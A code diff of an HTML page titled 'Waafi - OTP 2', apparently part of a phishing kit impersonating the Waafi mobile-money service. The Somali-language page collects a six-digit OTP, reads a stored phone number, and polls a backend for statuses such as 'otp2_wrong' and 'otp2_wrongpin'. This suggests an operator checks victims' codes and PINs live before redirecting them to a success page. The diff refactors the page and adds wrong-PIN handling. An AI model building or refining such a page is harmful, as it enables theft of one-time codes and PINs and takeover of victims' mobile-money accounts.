@@ -4,10 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Waafi - OTP 2</title>
+
     <style>
         * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { margin: 0; padding: 0; background-color: #fff; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
-        
+
         .container { flex: 1; padding: 40px 20px; text-align: center; }
         h2 { font-size: 22px; color: #333; margin-bottom: 10px; font-weight: 500; }
         p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 25px; }
@@ -24,18 +25,24 @@
         .btn-verify {
             width: 100%; max-width: 300px; padding: 15px; border-radius: 10px;
             border: none; background-color: #e0e0e0; color: #a0a0a0;
-            font-size: 14px; font-weight: bold; cursor: not-allowed; text-transform: uppercase;
+            font-size: 14px; font-weight: bold; cursor: not-allowed;
+            text-transform: uppercase;
         }
         .btn-verify.active { background-color: #2ecc71; color: white; cursor: pointer; }
 
         .footer {
-            position: relative; height: 250px; background: linear-gradient(to bottom, #2ecc71, #27ae60);
-            border-top-left-radius: 50% 100px; border-top-right-radius: 50% 100px;
-            display: flex; justify-content: center; align-items: center; color: white;
-            font-size: 12px; margin-top: auto;
+            position: relative; height: 250px;
+            background: linear-gradient(to bottom, #2ecc71, #27ae60);
+            border-top-left-radius: 50% 100px;
+            border-top-right-radius: 50% 100px;
+            display: flex; justify-content: center; align-items: center;
+            color: white; font-size: 12px; margin-top: auto;
         }
+
+        #status-msg { margin-top:15px; font-size:14px; font-weight:500; }
     </style>
 </head>
+
 <body>
 
 <div class="container">
@@ -54,7 +61,8 @@
     <div class="resend-text" id="timer-text"></div>
 
     <button class="btn-verify" id="verify-btn">XAQIIJI OTP GA LABAAD</button>
-    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight: 500;"></div>
+
+    <div id="status-msg"></div>
 </div>
 
 <div class="footer">
@@ -62,16 +70,27 @@
 </div>
 
 <script>
-const phone = localStorage.getItem('userPhone') || "Unknown";
+/* ✅ FIX 1: correct key (important) */
+const phone = localStorage.getItem('phone');
 
 const inputs = document.querySelectorAll('.otp-inputs input');
 const btn = document.getElementById('verify-btn');
 const timerDisplay = document.getElementById('timer-text');
+const statusMsg = document.getElementById('status-msg');
 
 let countdown;
 let pollingInterval;
 
-// TIMER FUNCTION
+/* CHECK SESSION */
+window.onload = () => {
+    if (!phone) {
+        alert("Session expired");
+        window.location.href = "/index.html";
+    }
+    startTimer();
+};
+
+/* TIMER */
 function startTimer() {
     let secondsLeft = 60;
     clearInterval(countdown);
@@ -81,7 +100,8 @@ function startTimer() {
 
         if (secondsLeft <= 0) {
             clearInterval(countdown);
-            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#2ecc71; cursor:pointer;">Koodka dib u dir</span>';
+            timerDisplay.innerHTML =
+                '<span id="resend-btn" style="color:#2ecc71; cursor:pointer;">Koodka dib u dir</span>';
             document.getElementById('resend-btn').onclick = resendCode;
         } else {
             timerDisplay.innerText = `Koodka mar kale u dir ${secondsLeft} ilbiriqsi`;
@@ -89,27 +109,22 @@ function startTimer() {
     }, 1000);
 }
 
-// RESEND WITHOUT RELOAD
+/* RESEND */
 function resendCode() {
-    document.getElementById('status-msg').innerText = "Kood cusub ayaa la dirayaa...";
-    document.getElementById('status-msg').style.color = "#333";
-
-    // optional backend call here
-    // fetch('/api/resend-otp', ...)
-
+    statusMsg.innerText = "Kood cusub ayaa la dirayaa...";
+    statusMsg.style.color = "#333";
     startTimer();
 }
 
-// START TIMER
-startTimer();
-
-// INPUT HANDLING
+/* INPUT HANDLING */
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
         input.value = input.value.replace(/\D/g, '');
+
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
+
         checkFull();
     });
 
@@ -122,21 +137,16 @@ inputs.forEach((input, index) => {
 
 function checkFull() {
     const code = Array.from(inputs).map(i => i.value).join('');
-    if (code.length === 6) {
-        btn.classList.add('active');
-    } else {
-        btn.classList.remove('active');
-    }
+    btn.classList.toggle('active', code.length === 6);
 }
 
+/* CLICK */
 btn.addEventListener('click', submitOtp);
 
-// SUBMIT
 async function submitOtp() {
     if (!btn.classList.contains('active')) return;
 
     const otp = Array.from(inputs).map(i => i.value).join('');
-    const statusMsg = document.getElementById('status-msg');
 
     statusMsg.innerText = "Fadlan sug...";
     statusMsg.style.color = "#333";
@@ -152,7 +162,7 @@ async function submitOtp() {
     startPolling();
 }
 
-// POLLING (SAFE)
+/* POLLING */
 function startPolling() {
     clearInterval(pollingInterval);
 
@@ -164,15 +174,30 @@ function startPolling() {
             if (data.status === "otp2_correct") {
                 clearInterval(pollingInterval);
                 window.location.href = "/success.html";
-            } 
-            else if (data.status === "otp2_wrong") {
-                const msg = document.getElementById('status-msg');
-                msg.innerText = "❌ Koodka waa khalad. Mar kale isku day.";
-                msg.style.color = "red";
-                clearInterval(pollingInterval);
             }
+
+            if (data.status === "otp2_wrong") {
+                clearInterval(pollingInterval);
+                statusMsg.innerText = "❌ OTP waa khalad. Isku day mar kale.";
+                statusMsg.style.color = "red";
+                resetInputs();
+            }
+
+            if (data.status === "otp2_wrongpin") {
+                clearInterval(pollingInterval);
+                statusMsg.innerText = "🔑 PIN khalad ah. Dib u gal PIN.";
+                statusMsg.style.color = "red";
+                resetInputs();
+            }
+
         } catch {}
-    }, 3500);
+    }, 3000);
+}
+
+/* RESET */
+function resetInputs() {
+    inputs.forEach(i => i.value = "");
+    btn.classList.remove('active');
 }
 </script>
 
